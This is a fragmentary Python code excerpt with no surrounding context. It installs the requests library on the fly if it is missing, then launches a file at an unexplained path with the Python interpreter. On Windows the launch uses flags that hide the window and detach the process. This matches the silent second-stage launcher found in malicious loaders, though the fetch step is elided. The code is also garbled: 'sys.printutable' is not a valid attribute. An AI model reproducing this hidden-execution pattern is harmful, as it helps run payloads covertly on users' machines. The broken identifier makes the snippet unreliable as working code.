...
try:import requests
except:subprocess.check_call([sys.printutable, '-m', 'pip', 'install', 'requests']);import requests
...
if res:
    if ot=="Windows":subprocess.Popen([sys.printutable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.printutable, ap])
